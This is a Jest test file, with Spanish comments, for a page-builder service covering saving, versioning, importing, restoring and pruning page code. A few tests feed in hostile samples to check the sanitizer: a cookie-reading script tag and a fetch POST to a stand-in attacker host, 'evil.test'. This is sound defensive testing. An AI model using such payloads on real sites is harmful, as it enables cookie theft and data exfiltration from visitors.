/**
 * Page Builder — FASE 3: guardar código y versionar.
 *
 * Lo que se verifica acá es la garantía central del módulo: GUARDAR NUNCA
 * TOCA LO QUE VE EL VISITANTE. Crea una versión nueva, mueve el borrador,
 * y `published_version_id` se queda exactamente donde estaba.
 *
 * LandingCodigoService va REAL, no mockeado: es el único sanitizador del
 * proyecto y lo que importa probar es que el Page Builder lo usa de
 * verdad (que le llegan los límites nuevos, que reparte un documento
 * pegado, que recorta lo que tiene que recortar).
 */

const mockTX = Symbol('transaction');

jest.mock('../models', () => ({
  sequelize: { transaction: jest.fn(async (cb) => cb(mockTX)) },
  BuilderPage: { findOne: jest.fn() },
  BuilderPageVersion: {
    findOne: jest.fn(),
    findAll: jest.fn(),
    create: jest.fn(),
    update: jest.fn(),
    destroy: jest.fn(),
    max: jest.fn(),
  },
}));

const { sequelize, BuilderPage, BuilderPageVersion } = require('../models');
const TX = mockTX;
const BuilderPageVersionService = require('../services/builderPageVersion.service');
const { LIMITES, MAX_VERSIONES } = require('../services/builderPageVersion.service');

/** Página con `save` espiable, como la devuelve Sequelize. */
function paginaMock(extra = {}) {
  return {
    id: 10, proyecto_id: 5, funnel_id: null, usuario_id: 1, inquilino_id: 2,
    nombre: 'Landing', slug: 'landing-aaa111', estado: 'draft',
    draft_version_id: null, published_version_id: null, published_at: null,
    save: jest.fn(),
    ...extra,
  };
}

beforeEach(() => {
  jest.clearAllMocks();
  sequelize.transaction.mockImplementation(async (cb) => cb(mockTX));
  BuilderPageVersion.max.mockResolvedValue(null);
  BuilderPageVersion.findAll.mockResolvedValue([]);
  BuilderPageVersion.create.mockImplementation(async (datos) => ({ id: 900, ...datos }));
});

// ───────────────────────────────────────────────────────────────────────
describe('Guardar (T-2 a T-5)', () => {

  test('crea la v1 en estado draft y mueve el borrador', async () => {
    const pagina = paginaMock();
    BuilderPage.findOne.mockResolvedValue(pagina);

    const res = await BuilderPageVersionService.guardar(10, 1, {
      html: '<h1>Hola</h1>', css: 'h1{color:red}', js: 'console.log(1)',
    });

    const [datos] = BuilderPageVersion.create.mock.calls[0];
    expect(datos).toMatchObject({ pagina_id: 10, version: 1, estado: 'draft', creado_por: 1 });
    expect(pagina.draft_version_id).toBe(900);
    expect(res.version.version).toBe(1);
  });

  test('guarda HTML, CSS y JS en sus campos', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    await BuilderPageVersionService.guardar(10, 1, {
      html: '<section class="hero"><h1>Creatina</h1></section>',
      css: '.hero{padding:40px}',
      js: 'document.querySelector(".hero").dataset.ok = 1',
    });

    const [datos] = BuilderPageVersion.create.mock.calls[0];
    expect(datos.html).toContain('class="hero"');
    expect(datos.css).toContain('padding:40px');
    expect(datos.js).toContain('dataset.ok');
    expect(datos.bytes).toBeGreaterThan(0);
  });

  test('numera las versiones de forma correlativa por página', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock({ draft_version_id: 899 }));
    BuilderPageVersion.max.mockResolvedValue(4);

    await BuilderPageVersionService.guardar(10, 1, { html: '<p>x</p>' });

    expect(BuilderPageVersion.create.mock.calls[0][0].version).toBe(5);
  });

  test('archiva el borrador anterior', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock({ draft_version_id: 899 }));

    await BuilderPageVersionService.guardar(10, 1, { html: '<p>x</p>' });

    expect(BuilderPageVersion.update).toHaveBeenCalledWith(
      { estado: 'archived' },
      expect.objectContaining({ where: { id: 899, estado: 'draft' } }),
    );
  });

  test('NO archiva el borrador anterior si además es la versión publicada', async () => {
    // Una fila publicada es inmutable hasta que se publique otra.
    BuilderPage.findOne.mockResolvedValue(paginaMock({
      draft_version_id: 899, published_version_id: 899,
    }));

    await BuilderPageVersionService.guardar(10, 1, { html: '<p>x</p>' });

    expect(BuilderPageVersion.update).not.toHaveBeenCalled();
  });

  test('pasa el código por el sanitizador real: saca los <script> del HTML', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    const res = await BuilderPageVersionService.guardar(10, 1, {
      html: '<div>ok</div><script>alert(document.cookie)</script>',
    });

    expect(BuilderPageVersion.create.mock.calls[0][0].html).not.toContain('alert');
    // Y se le avisa al usuario qué se le quitó, para que el editor pueda
    // reemplazar su borrador con lo que realmente quedó guardado.
    expect(res.advertencias.join(' ')).toMatch(/script/i);
    expect(res.codigo.html).not.toContain('alert');
  });

  test('rechaza JavaScript que no tiene uso legítimo en una página', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    await expect(BuilderPageVersionService.guardar(10, 1, {
      html: '<p>x</p>', js: 'fetch("https://evil.test", {method:"POST"})',
    })).rejects.toMatchObject({ errores: expect.arrayContaining([expect.stringMatching(/fetch/i)]) });

    expect(BuilderPageVersion.create).not.toHaveBeenCalled();
  });

  test('acepta un HTML que a una landing no le entraría', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    // 300 KB pasa el techo de una landing (200 KB) pero entra holgado en
    // el builder. Una página generada por una IA pesa esto.
    await expect(BuilderPageVersionService.guardar(10, 1, {
      html: `<p>${'a'.repeat(300 * 1024)}</p>`,
    })).resolves.toBeDefined();
  });

  test('corta un campo suelto absurdo', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    await expect(BuilderPageVersionService.guardar(10, 1, {
      html: `<p>${'a'.repeat(520 * 1024)}</p>`,
    })).rejects.toMatchObject({ errores: expect.arrayContaining([expect.stringMatching(/HTML/)]) });
  });

  test('el límite que manda es el TOTAL, aunque ningún campo suelto se pase', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock());

    // 450 KB de HTML (< 500) + 180 KB de CSS (< 200) = 630 KB > 600.
    // Si los topes por campo sumaran justo el total, este caso no podría
    // existir y la validación del total no serviría para nada.
    await expect(BuilderPageVersionService.guardar(10, 1, {
      html: `<p>${'a'.repeat(450 * 1024)}</p>`,
      css: `/*${'b'.repeat(180 * 1024)}*/`,
    })).rejects.toMatchObject({
      errores: expect.arrayContaining([expect.stringMatching(/total/i)]),
    });
  });

  test('una página de otro usuario da 404', async () => {
    BuilderPage.findOne.mockResolvedValue(null);
    await expect(BuilderPageVersionService.guardar(10, 999, { html: '<p>x</p>' }))
      .rejects.toMatchObject({ status: 404 });
  });
});

// ───────────────────────────────────────────────────────────────────────
describe('Guardar NO publica (T-10, primera mitad)', () => {

  test('published_version_id queda intacto después de guardar', async () => {
    const pagina = paginaMock({
      draft_version_id: 800, published_version_id: 700, estado: 'published',
    });
    BuilderPage.findOne.mockResolvedValue(pagina);
    BuilderPageVersion.max.mockResolvedValue(8);

    await BuilderPageVersionService.guardar(10, 1, { html: '<p>version nueva</p>' });

    // Lo único que se movió es el borrador.
    expect(pagina.draft_version_id).toBe(900);
    expect(pagina.published_version_id).toBe(700);
    expect(pagina.estado).toBe('published');
  });

  test('la versión nueva nace draft, nunca published', async () => {
    BuilderPage.findOne.mockResolvedValue(paginaMock({ published_version_id: 700 }));
    await BuilderPageVersionService.guardar(10, 1, { html: '<p>x</p>' });
    expect(BuilderPageVersion.create.mock.calls[0][0].estado).toBe('draft');
  });
});

// ───────────────────────────────────────────────────────────────────────
describe('Importar un documento completo (T-20)', () => {

  beforeEach(() => BuilderPage.findOne.mockResolvedValue(paginaMock()));

  test('reparte <style> y <script> en sus pestañas', async () => {
    const documento = `<!DOCTYPE html>
<html><head><style>body{margin:0}</style></head>
<body><h1>Creatina</h1><script>console.log('hola')</script></body></html>`;

    const res = await BuilderPageVersionService.importar(10, 1, documento);

    expect(res.codigo.html).toContain('<h1>Creatina</h1>');
    expect(res.codigo.html).not.toContain('<style>');
    expect(res.codigo.css).toContain('body{margin:0}');
    expect(res.codigo.js).toContain("console.log('hola')");
    expect(res.advertencias.length).toBeGreaterThan(0);
  });

  test('NO guarda nada: importar es solo repartir', async () => {
    await BuilderPageVersionService.importar(10, 1, '<html><body><p>x</p></body></html>');
    expect(BuilderPageVersion.create).not.toHaveBeenCalled();
  });

  test('rechaza un documento vacío', async () => {
    await expect(BuilderPageVersionService.importar(10, 1, '   '))
      .rejects.toMatchObject({ status: 422 });
  });
});

// ───────────────────────────────────────────────────────────────────────
describe('Restaurar una versión vieja', () => {

  test('la copia como borrador NUEVO en vez de revivir la vieja', async () => {
    const pagina = paginaMock({ draft_version_id: 899 });
    BuilderPage.findOne.mockResolvedValue(pagina);
    BuilderPageVersion.findOne.mockResolvedValue({
      id: 700, pagina_id: 10, version: 3,
      html: '<p>la vieja</p>', css: '', js: '',
    });
    BuilderPageVersion.max.mockResolvedValue(8);

    const res = await BuilderPageVersionService.restaurar(10, 700, 1);

    const [datos] = BuilderPageVersion.create.mock.calls[0];
    expect(datos.version).toBe(9);              // se agrega arriba, no reescribe
    expect(datos.html).toContain('la vieja');
    expect(datos.nota).toMatch(/v3/);
    expect(res.version.version).toBe(9);
  });
});

// ───────────────────────────────────────────────────────────────────────
describe('Poda de versiones (T-16)', () => {

  const muchas = (n) => Array.from({ length: n }, (_, i) => ({ id: 1000 - i, version: n - i }));

  test('no borra nada si no se pasó del máximo', async () => {
    BuilderPageVersion.findAll.mockResolvedValue(muchas(MAX_VERSIONES));
    const borradas = await BuilderPageVersionService.podar(paginaMock(), TX);
    expect(borradas).toBe(0);
    expect(BuilderPageVersion.destroy).not.toHaveBeenCalled();
  });

  test('borra las archivadas más viejas cuando se pasa', async () => {
    BuilderPageVersion.findAll.mockResolvedValue(muchas(MAX_VERSIONES + 5));
    const borradas = await BuilderPageVersionService.podar(paginaMock(), TX);
    expect(borradas).toBe(5);
  });

  test('NUNCA borra la publicada ni el borrador, aunque sean las más viejas', async () => {
    const versiones = muchas(MAX_VERSIONES + 5);
    const masViejas = versiones.slice(-5).map(v => v.id);

    // Las dos últimas de la lista son justo la publicada y el borrador.
    const pagina = paginaMock({
      published_version_id: masViejas[4],
      draft_version_id: masViejas[3],
    });

    BuilderPageVersion.findAll.mockResolvedValue(versiones);
    const borradas = await BuilderPageVersionService.podar(pagina, TX);

    expect(borradas).toBe(3);
    const idsBorrados = BuilderPageVersion.destroy.mock.calls[0][0].where.id[Object.getOwnPropertySymbols(
      BuilderPageVersion.destroy.mock.calls[0][0].where.id,
    )[0]];
    expect(idsBorrados).not.toContain(pagina.published_version_id);
    expect(idsBorrados).not.toContain(pagina.draft_version_id);
  });
});

// ───────────────────────────────────────────────────────────────────────
describe('Límites configurados', () => {

  test('el builder usa techos más altos que una landing', () => {
    expect(LIMITES.maxHtml).toBe(500 * 1024);
    expect(LIMITES.maxTotal).toBe(600 * 1024);
  });

  test('los topes por campo suman MÁS que el total, si no el total sería decorativo', () => {
    expect(LIMITES.maxHtml + LIMITES.maxCss + LIMITES.maxJs)
      .toBeGreaterThan(LIMITES.maxTotal);
  });
});
